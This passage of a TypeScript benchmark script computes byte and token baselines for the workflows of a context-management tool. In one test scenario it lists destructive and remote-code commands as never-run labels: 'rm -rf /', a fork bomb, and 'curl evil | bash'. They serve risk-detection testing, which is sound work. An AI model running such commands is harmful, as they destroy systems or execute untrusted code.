    { label: "analyze",      tool: "ctx_execute", rawEquivalent: "node -e <analysis>", rawBytes: exec,     rawTokens: estimateTokens(exec) },
  ];
}

async function jsonExtractDepsRaw(): Promise<StepRaw[]> {
  const p = join(repoRoot, "package.json");
  const code = `
const fs = require("node:fs");
const pkg = JSON.parse(fs.readFileSync(${JSON.stringify(p)}, "utf8"));
const deps = Object.keys(pkg.dependencies || {}).sort();
const dev = Object.keys(pkg.devDependencies || {}).sort();
console.log("dep count:", deps.length);
console.log("dev count:", dev.length);
console.log("deps:", deps.join(", "));
console.log("devDeps:", dev.join(", "));
`;
  const exec = rawNodeExec(code);
  return [
    { label: "extract-deps", tool: "ctx_execute", rawEquivalent: "node -e <extract deps>", rawBytes: exec, rawTokens: estimateTokens(exec) },
  ];
}

async function timeoutTruncationRaw(): Promise<StepRaw[]> {
  // Native equivalent of "infinite loop with 1.5s timeout" = the lines that
  // would have streamed in that window. Approximate by running the same code
  // with a real timeout via spawnSync timeout option.
  const r = spawnSync(process.execPath, ["-e", `let i = 0; while (true) { console.log("line " + i++); if (i > 1e7) break; }`], { encoding: "buffer", timeout: 1500, maxBuffer: 50 * 1024 * 1024 });
  const bytes = (r.stdout?.length ?? 0) + (r.stderr?.length ?? 0);
  return [
    { label: "infinite-loop", tool: "ctx_execute", rawEquivalent: "node -e <loop> (1.5s cap)", rawBytes: bytes, rawTokens: estimateTokens(bytes) },
  ];
}

async function burstSearchRatelimitRaw(): Promise<StepRaw[]> {
  // 10 grep calls with no corpus = 0 bytes each. The point of this scenario is
  // to test rate-limit behavior, not byte savings; raw column is effectively 0.
  const steps: StepRaw[] = [];
  for (let i = 0; i < 10; i++) {
    steps.push({ label: `search-${i + 1}`, tool: "ctx_search", rawEquivalent: "grep <term> <no corpus>", rawBytes: 0, rawTokens: 0 });
  }
  return steps;
}

async function diffRenameDetectionRaw(): Promise<StepRaw[]> {
  const b = rawShellEcho("git diff HEAD~10 HEAD");
  return [
    { label: "diff-recent", tool: "ctx_diff", rawEquivalent: "git diff HEAD~10 HEAD", rawBytes: b, rawTokens: estimateTokens(b) },
  ];
}

async function mixedLanguageSymbolsRaw(): Promise<StepRaw[]> {
  // Inline-mirror of workflow content.
  const TS_SRC = `export class FooBar {\n  doSomething(x: number): string {\n    return "value=" + x;\n  }\n}\nexport function unrelated(): void { /* noop */ }\n`;
  const PY_SRC = `class FooBar:\n    def do_something(self, x: int) -> str:\n        return f"value={x}"\n\ndef unrelated():\n    pass\n`;
  const GO_SRC = `package main\n\ntype FooBar struct{}\n\nfunc (f *FooBar) DoSomething(x int) string {\n\treturn fmt.Sprintf("value=%d", x)\n}\n\nfunc unrelated() {}\n`;
  return [
    { label: "ts-symbols", tool: "ctx_read", rawEquivalent: "cat Foo.ts", rawBytes: Buffer.byteLength(TS_SRC, "utf8"), rawTokens: estimateTokens(Buffer.byteLength(TS_SRC, "utf8")) },
    { label: "py-symbols", tool: "ctx_read", rawEquivalent: "cat foo.py", rawBytes: Buffer.byteLength(PY_SRC, "utf8"), rawTokens: estimateTokens(Buffer.byteLength(PY_SRC, "utf8")) },
    { label: "go-symbols", tool: "ctx_read", rawEquivalent: "cat foo.go", rawBytes: Buffer.byteLength(GO_SRC, "utf8"), rawTokens: estimateTokens(Buffer.byteLength(GO_SRC, "utf8")) },
  ];
}

async function ctxRouteDangerousRaw(): Promise<StepRaw[]> {
  // Native equivalent: nothing — user would just type the command. We do NOT
  // actually run rm -rf /. Set raw to 0; the win is fork detecting risk.
  return [
    { label: "route-rm-rf-root",     tool: "ctx_route", rawEquivalent: "rm -rf / (NOT RUN)",       rawBytes: 0, rawTokens: 0 },
    { label: "route-fork-bomb",      tool: "ctx_route", rawEquivalent: ":(){:|:&};: (NOT RUN)",    rawBytes: 0, rawTokens: 0 },
    { label: "route-curl-pipe-bash", tool: "ctx_route", rawEquivalent: "curl evil | bash (NOT RUN)", rawBytes: 0, rawTokens: 0 },
  ];
}

const NOISY_3 = `
for (let i = 0; i < 600; i++) {
  console.log("[trace] noisy " + i + " token-" + (i % 23) + " filler-" + i.toString(36));
}
console.log("END marker-zeta-omega");
`;
async function sidecarVsRerunCostRaw(): Promise<StepRaw[]> {
  const b = rawNodeExec(NOISY_3);
  return [
    { label: "first-run",     tool: "ctx_execute",   rawEquivalent: "node -e <noisy>",       rawBytes: b, rawTokens: estimateTokens(b) },
    { label: "fetch-sidecar", tool: "ctx_fetch_run", rawEquivalent: "(re-run, same bytes)",  rawBytes: b, rawTokens: estimateTokens(b) },
    { label: "rerun",         tool: "ctx_execute",   rawEquivalent: "node -e <noisy> again", rawBytes: b, rawTokens: estimateTokens(b) },
  ];
}

const SEARCH_QUALITY_CORPUS = `
const fs = require("node:fs");
const distinct_token = "RUTABAGA_ALPHA_42";
const sections = [
  "intro: greetings and overview",
  "section alpha: discusses cabbages and cabbits",
  "section beta: a wholly unrelated tangent about RUTABAGA_ALPHA_42 the marker",
  "section gamma: closing thoughts on root vegetables",
  "section delta: more about cabbages",
  "section epsilon: pumpkins and gourds",
];
for (const s of sections) console.log(s);
console.log("END corpus");
`;
async function searchRelevanceQualityRaw(): Promise<StepRaw[]> {
  const index = rawNodeExec(SEARCH_QUALITY_CORPUS);
  const stdout = (() => {
    const r = spawnSync(process.execPath, ["-e", SEARCH_QUALITY_CORPUS], { encoding: "utf8" });
    return (r.stdout || "") + (r.stderr || "");
  })();
  const grep = rawGrepText(stdout, [/RUTABAGA_ALPHA_42/]);
  return [
    { label: "index-corpus",  tool: "ctx_execute", rawEquivalent: "node -e <corpus>",        rawBytes: index, rawTokens: estimateTokens(index) },
    { label: "search-marker", tool: "ctx_search",  rawEquivalent: "grep RUTABAGA_ALPHA_42",  rawBytes: grep,  rawTokens: estimateTokens(grep) },
  ];
}

const MD_FM = `---\ntitle: Sample Doc\ndate: 2026-05-20\ntags: [alpha, beta]\nstatus: draft\n---\n\n# Introduction\nBody text here.\n\n## Section A\nLorem ipsum dolor sit amet.\n\n## Section B\nConsectetur adipiscing elit.\n\n### Sub-section B.1\nMauris quis nisl.\n`;
async function ctxReadFrontmatterRaw(): Promise<StepRaw[]> {
  const full = Buffer.byteLength(MD_FM, "utf8");
  const slice = Buffer.byteLength(MD_FM.split("\n").slice(0, 15).join("\n"), "utf8");
  return [
    { label: "map",     tool: "ctx_read", rawEquivalent: "cat sample.md",         rawBytes: full,  rawTokens: estimateTokens(full) },
    { label: "outline", tool: "ctx_read", rawEquivalent: "cat sample.md",         rawBytes: full,  rawTokens: estimateTokens(full) },
    { label: "slice",   tool: "ctx_read", rawEquivalent: "head -15 sample.md",    rawBytes: slice, rawTokens: estimateTokens(slice) },
  ];
}

async function trivialCommandNoRecommendRaw(): Promise<StepRaw[]> {
  const cmds = ["git status", "git branch --show-current", "ls -la", "node --version", "echo done"];
  const out: StepRaw[] = [];
  for (const c of cmds) {
    const b = rawShellEcho(c);
    const label = `route-${c.replace(/[^a-z0-9]+/gi, "-").slice(0, 30)}`;
    out.push({ label, tool: "ctx_route", rawEquivalent: c, rawBytes: b, rawTokens: estimateTokens(b) });
  }
  return out;
}

const SYMLINK_TARGET_SRC = "export const SYMLINK_MARKER = 'resolved-ok';\nexport function fn() { return SYMLINK_MARKER; }\n";
async function symlinkResolutionRaw(): Promise<StepRaw[]> {
  const b = Buffer.byteLength(SYMLINK_TARGET_SRC, "utf8");
  return [
    { label: "read-via-link", tool: "ctx_read", rawEquivalent: "cat target.ts", rawBytes: b, rawTokens: estimateTokens(b) },
  ];
}

const BM25_CORPUS = `
const fs = require("node:fs");
const lines = [];
for (let i = 0; i < 80; i++) lines.push("noisy section " + i + " repeated words common common common");
lines.push("special unique section: zebrafish_indicator_xyz keyword RAREMARKER");
for (let i = 0; i < 30; i++) lines.push("more noise " + i + " filler tokens");
for (const l of lines) console.log(l);
`;
async function bm25VsGrepRaw(): Promise<StepRaw[]> {
  const index = rawNodeExec(BM25_CORPUS);
  const stdout = (() => {
    const r = spawnSync(process.execPath, ["-e", BM25_CORPUS], { encoding: "utf8" });
    return (r.stdout || "") + (r.stderr || "");
  })();
  const grep = rawGrepText(stdout, [/RAREMARKER/, /zebrafish_indicator_xyz/]);
  return [
    { label: "index",       tool: "ctx_execute", rawEquivalent: "node -e <corpus>",       rawBytes: index, rawTokens: estimateTokens(index) },
    { label: "search-rare", tool: "ctx_search",  rawEquivalent: "grep RAREMARKER <stdout>", rawBytes: grep,  rawTokens: estimateTokens(grep) },
  ];
}

async function mixedSandboxLangsRaw(): Promise<StepRaw[]> {
  // Bash loop simulated directly (cmd.exe rejects $-substitution loops on Windows).
  let shellSim = "";
  for (let i = 1; i <= 5; i++) shellSim += `line ${i} marker-LANG-SHELL\n`;
  const shellBytes = Buffer.byteLength(shellSim, "utf8");
  const jsBytes = rawNodeExec("for (let i = 1; i <= 5; i++) console.log(`line ${i} marker-LANG-JS`);");
  // Python may or may not be installed; spawnSync python -c
  const pyR = spawnSync("python", ["-c", "for i in range(1, 6):\n    print(f'line {i} marker-LANG-PY')"], { encoding: "buffer" });
  const pyBytes = (pyR.stdout?.length ?? 0) + (pyR.stderr?.length ?? 0);
  return [
    { label: "shell",      tool: "ctx_execute", rawEquivalent: "bash <loop>",     rawBytes: shellBytes, rawTokens: estimateTokens(shellBytes) },
    { label: "javascript", tool: "ctx_execute", rawEquivalent: "node -e <loop>",  rawBytes: jsBytes,    rawTokens: estimateTokens(jsBytes) },
    { label: "python",     tool: "ctx_execute", rawEquivalent: "python -c <loop>", rawBytes: pyBytes,   rawTokens: estimateTokens(pyBytes) },
  ];
}

async function hugeLineCountFileRaw(): Promise<StepRaw[]> {
  // 100_000 lines × avg ~40 bytes = ~4 MB. Compute exact bytes by formula.
  const lines: string[] = [];
  for (let i = 0; i < 100; i++) {
    lines.push(`[${i % 4 === 0 ? "INFO" : i % 4 === 1 ? "WARN" : i % 4 === 2 ? "ERROR" : "DEBUG"}] event ${i} token-${i % 31}`);
  }
  const avgLineBytes = Buffer.byteLength(lines.join("\n"), "utf8") / 100;
  const fullEst = Math.round(avgLineBytes * 100_000);
  const sliceLines: string[] = [];
  for (let i = 0; i < 50; i++) {
    sliceLines.push(`[${i % 4 === 0 ? "INFO" : i % 4 === 1 ? "WARN" : i % 4 === 2 ? "ERROR" : "DEBUG"}] event ${i} token-${i % 31}`);
  }
  const sliceBytes = Buffer.byteLength(sliceLines.join("\n"), "utf8");
  return [
    { label: "map",     tool: "ctx_read", rawEquivalent: "cat huge.log (~4 MB est)", rawBytes: fullEst,   rawTokens: estimateTokens(fullEst) },
    { label: "outline", tool: "ctx_read", rawEquivalent: "cat huge.log (~4 MB est)", rawBytes: fullEst,   rawTokens: estimateTokens(fullEst) },
    { label: "slice",   tool: "ctx_read", rawEquivalent: "head -50 huge.log",        rawBytes: sliceBytes, rawTokens: estimateTokens(sliceBytes) },
  ];
}

const UNICODE_FIXTURE = `# 多语言测试\n\nThis file mixes scripts: 中文, Español, العربية, русский, 日本語, ไทย.\n\n## 表情符号 — Emoji\n\n- 🚀 rocket\n- 🐉 dragon\n- 🦄 unicorn\n- 💯 perfect\n\n## Code-ish\n\n\`\`\`ts\nconst greeting = "Hello, 世界! 🌍";\n\`\`\`\n\nEnd — fin — 终。\n`;
async function unicodeEmojiRaw(): Promise<StepRaw[]> {
  const full = Buffer.byteLength(UNICODE_FIXTURE, "utf8");
  const slice = Buffer.byteLength(UNICODE_FIXTURE.split("\n").slice(0, 15).join("\n"), "utf8");
  return [
    { label: "map",     tool: "ctx_read", rawEquivalent: "cat unicode.md",      rawBytes: full,  rawTokens: estimateTokens(full) },
    { label: "outline", tool: "ctx_read", rawEquivalent: "cat unicode.md",      rawBytes: full,  rawTokens: estimateTokens(full) },
    { label: "slice",   tool: "ctx_read", rawEquivalent: "head -15 unicode.md", rawBytes: slice, rawTokens: estimateTokens(slice) },
  ];
}

async function buildAll(): Promise<WorkflowRaw[]> {
  const defs: Array<{ name: string; fn: () => Promise<StepRaw[]> }> = [
    { name: "bug-hunt", fn: bugHuntRaw },
    { name: "codebase-explore", fn: codebaseExploreRaw },
    { name: "debug-test", fn: debugTestRaw },
    { name: "doc-lookup", fn: docLookupRaw },
    { name: "log-triage", fn: logTriageRaw },
    { name: "markdown-outline", fn: markdownOutlineRaw },
    { name: "instruction-config", fn: instructionConfigRaw },
    { name: "large-file-slice", fn: largeFileSliceRaw },
    { name: "bundle-search", fn: bundleSearchRaw },
    { name: "bundle-tool-list", fn: bundleToolListRaw },
    { name: "noisy-sidecar", fn: noisySidecarRaw },
    { name: "stats-believability", fn: statsBelievabilityRaw },
    { name: "broken-code", fn: brokenCodeRaw },
    { name: "cross-file-count", fn: crossFileCountRaw },
    { name: "semantic-nav-control", fn: semanticNavControlRaw },
    { name: "ctx-diff-branch", fn: ctxDiffBranchRaw },
    { name: "ctx-diff-summary", fn: ctxDiffSummaryRaw },
    // batch 2
    { name: "sidecar-followup", fn: sidecarFollowupRaw },
    { name: "ctx-diff-stat-variants", fn: ctxDiffStatVariantsRaw },
    { name: "compact-vs-serena-md", fn: compactVsSerenaMdRaw },
    { name: "compact-vs-serena-json", fn: compactVsSerenaJsonRaw },
    { name: "compact-vs-serena-bundle", fn: compactVsSerenaBundleRaw },
    { name: "compact-vs-serena-broken", fn: compactVsSerenaBrokenRaw },
    { name: "small-output-guardrail", fn: smallOutputGuardrailRaw },
    { name: "cache-hit-dedup", fn: cacheHitDedupRaw },
    { name: "binary-refusal", fn: binaryRefusalRaw },
    { name: "network-failure", fn: networkFailureRaw },
    { name: "multi-file-refactor", fn: multiFileRefactorRaw },
    { name: "json-extract-deps", fn: jsonExtractDepsRaw },
    { name: "timeout-truncation", fn: timeoutTruncationRaw },
    { name: "burst-search-ratelimit", fn: burstSearchRatelimitRaw },
    { name: "diff-rename-detection", fn: diffRenameDetectionRaw },
    { name: "mixed-language-symbols", fn: mixedLanguageSymbolsRaw },
    { name: "ctx-route-dangerous", fn: ctxRouteDangerousRaw },
    { name: "sidecar-vs-rerun-cost", fn: sidecarVsRerunCostRaw },
    { name: "search-relevance-quality", fn: searchRelevanceQualityRaw },
    { name: "ctx-read-frontmatter", fn: ctxReadFrontmatterRaw },
    { name: "trivial-command-no-recommend", fn: trivialCommandNoRecommendRaw },
    { name: "symlink-resolution", fn: symlinkResolutionRaw },
    { name: "bm25-vs-grep", fn: bm25VsGrepRaw },
    { name: "mixed-sandbox-langs", fn: mixedSandboxLangsRaw },
    { name: "huge-line-count-file", fn: hugeLineCountFileRaw },
    { name: "unicode-emoji", fn: unicodeEmojiRaw },
  ];
  const out: WorkflowRaw[] = [];
  for (const d of defs) {
    console.log(`[compare] computing raw baseline for workflow ${d.name}`);
    const steps = await d.fn();
    const totalBytes = steps.reduce((a, s) => a + s.rawBytes, 0);
    out.push({
      workflow: d.name,
      steps,
      totalBytes,
      totalTokens: estimateTokens(totalBytes),
    });
    for (const s of steps) {
      console.log(`   ${d.name.padEnd(20)} ${s.label.padEnd(28)} raw=${s.rawBytes}B (${s.rawTokens} tok)`);
    }
  }
  return out;
}

function renderMd(rows: WorkflowRaw[]): string {
  const lines: string[] = [];
  lines.push(`# Workflow per-step raw native baseline`);
  lines.push("");
  lines.push(`Bytes each workflow step would dump into Claude's context if run via`);
  lines.push(`native tools only (no context-mode, no Serena). Pair with workflows-*.json`);
  lines.push(`to compute concrete upstream+fallback / fork+serena bytes per step.`);
  lines.push("");
  lines.push(`Token estimator: \`bytes / ${CHARS_PER_TOKEN}\` (override via CHARS_PER_TOKEN).`);
  lines.push("");
  for (const wf of rows) {
    lines.push(`## ${wf.workflow}`);
    lines.push("");
    lines.push(`| # | Step | Tool | Raw equivalent | Raw B | Raw T |`);
    lines.push(`|---|------|------|----------------|-------|-------|`);
    for (let i = 0; i < wf.steps.length; i++) {
      const s = wf.steps[i];
      lines.push(`| ${i + 1} | ${s.label} | ${s.tool} | ${s.rawEquivalent} | ${s.rawBytes} | ${s.rawTokens} |`);
    }
    lines.push("");
    lines.push(`**${wf.workflow} total raw:** ${wf.totalBytes} B / ${wf.totalTokens} tok`);
    lines.push("");
  }
  const grandTotalBytes = rows.reduce((a, r) => a + r.totalBytes, 0);
  const grandTotalTokens = rows.reduce((a, r) => a + r.totalTokens, 0);
  lines.push(`**Grand total (all workflows):** ${grandTotalBytes} B / ${grandTotalTokens} tok`);
  return lines.join("\n") + "\n";
}

async function main(): Promise<void> {
  console.log(`[compare] building workflow raw native baseline`);
  const rows = await buildAll();
  mkdirSync(reportDir, { recursive: true });
  const ts = new Date().toISOString().replace(/[:.]/g, "-");
  const jsonPath = join(reportDir, `workflow-raw-baseline-${ts}.json`);
  const mdPath = join(reportDir, `workflow-raw-baseline-${ts}.md`);
  const meta = buildMeta("workflow-raw-baseline");
  writeFileSync(jsonPath, JSON.stringify({ meta, rows }, null, 2));
  writeFileSync(mdPath, renderMd(rows));
  console.log(`[compare] wrote ${jsonPath}`);
  console.log(`[compare] wrote ${mdPath}`);
}

main().catch((e) => { console.error(e); process.exit(1); });
